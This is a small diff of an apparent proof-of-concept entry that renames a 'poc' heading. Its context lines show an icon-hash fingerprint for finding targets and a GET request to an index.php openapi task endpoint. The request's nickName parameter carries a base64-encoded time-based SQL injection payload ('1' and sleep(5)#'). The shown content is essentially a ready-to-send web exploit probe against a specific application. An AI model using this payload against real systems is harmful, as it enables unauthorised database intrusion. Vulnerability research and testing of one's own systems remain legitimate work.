@@ -8,7 +8,7 @@
 icon_hash="1652488516"
 ```
 
-## poc
+## POC
 
 ```java
 GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
